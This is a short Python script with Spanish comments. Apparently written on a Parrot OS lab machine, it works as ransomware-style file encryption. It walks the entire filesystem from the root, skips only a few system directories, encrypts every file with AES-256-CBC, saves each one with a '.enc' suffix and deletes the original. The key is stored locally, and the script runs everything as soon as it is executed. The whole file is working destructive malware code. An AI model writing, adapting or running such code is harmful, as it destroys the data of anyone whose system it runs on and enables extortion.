import os
import glob
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

# Ruta donde guardar la clave AES
KEY_FILE = "/home/parrot/Desktop/aes/aes_key.enc"

# Genera y guarda la clave AES si no existe
def get_or_create_key():
    if not os.path.exists(KEY_FILE):
        key = secrets.token_bytes(32)  # AES-256
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    return key

# Función para cifrar archivos
def encrypt_file(file_path, key):
    try:
        iv = secrets.token_bytes(16)  # IV de 16 bytes para AES-CBC
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        
        with open(file_path, "rb") as f:
            plaintext = f.read()
        
        padded_data = padder.update(plaintext) + padder.finalize()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()

        # Guarda el archivo cifrado
        encrypted_path = file_path + ".enc"
        with open(encrypted_path, "wb") as f:
            f.write(iv + ciphertext)  # Guarda IV + datos cifrados

        # Elimina el archivo original
        os.remove(file_path)
        print(f"Cifrado y eliminado: {file_path}")

    except Exception as e:
        print(f"Error cifrando {file_path}: {e}")

# Recorre el sistema de archivos y cifra todo excepto directorios críticos
def encrypt_system():
    key = get_or_create_key()
    exclude_dirs = ["/dev", "/proc", "/sys", "/run", "/tmp", "/var/lib", "/var/run"]

    for root, dirs, files in os.walk("/", topdown=True):
        # Evita cifrar directorios del sistema
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in exclude_dirs]
        
        for file in files:
            file_path = os.path.join(root, file)
            if not file_path.endswith(".enc"):  # No cifrar archivos ya cifrados
                encrypt_file(file_path, key)

# Ejecutar el cifrado
if __name__ == "__main__":
    encrypt_system()

